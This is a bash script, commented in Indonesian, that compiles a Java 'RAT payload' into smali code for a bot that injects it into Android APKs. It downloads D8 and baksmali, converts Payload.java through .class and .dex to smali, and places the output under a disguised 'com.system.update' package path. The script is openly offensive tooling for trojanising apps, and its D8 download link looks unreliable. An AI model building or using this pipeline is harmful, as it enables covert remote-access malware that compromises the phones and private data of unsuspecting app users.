#!/bin/bash

echo "======================================"
echo "   RAT PAYLOAD COMPILER (JAVA -> SMALI) "
echo "======================================"

# 1. Bikin folder kerja
mkdir -p rat_builder/payload_src/com/system/update
mkdir -p rat_builder/payload_smali
cd rat_builder/payload_src/com/system/update

# 2. Download alat D8 (buat ubah .class ke .dex)
if [ ! -f d8.jar ]; then
    echo "[~] Mendownload D8 Compiler..."
    wget -q https://github.com/google/android-classyshark/releases/download/8.2.0/d8.jar
fi

# 3. Download alat Baksmali (buat ubah .dex ke .smali)
if [ ! -f baksmali.jar ]; then
    echo "[~] Mendownload Baksmali..."
    wget -q https://github.com/baksmali/smali/releases/download/v2.5.2/baksmali-2.5.2.jar -O baksmali.jar
fi

# 4. Compile Java ke .class
echo "[~] Mengcompile Payload.java..."
javac Payload.java

# 5. Ubah .class ke .dex
echo "[~] Mengubah ke format Android (.dex)..."
java -cp d8.jar com.android.tools.r8.D8 Payload.class --output .

# 6. Ubah .dex jadi .smali
echo "[~] Mengubah ke Smali..."
java -jar baksmali.jar d classes.dex -o smali_out

# 7. Pindahin hasil Smali ke folder yang dibaca bot
echo "[~] Memindahkan file Smali ke folder Bot..."
cp -r smali_out/com ../../../../payload_smali/

echo "======================================"
echo " ✅ COMPILE SUKSES! "
echo " File .smali siap disuntik ke APK."
echo "======================================"
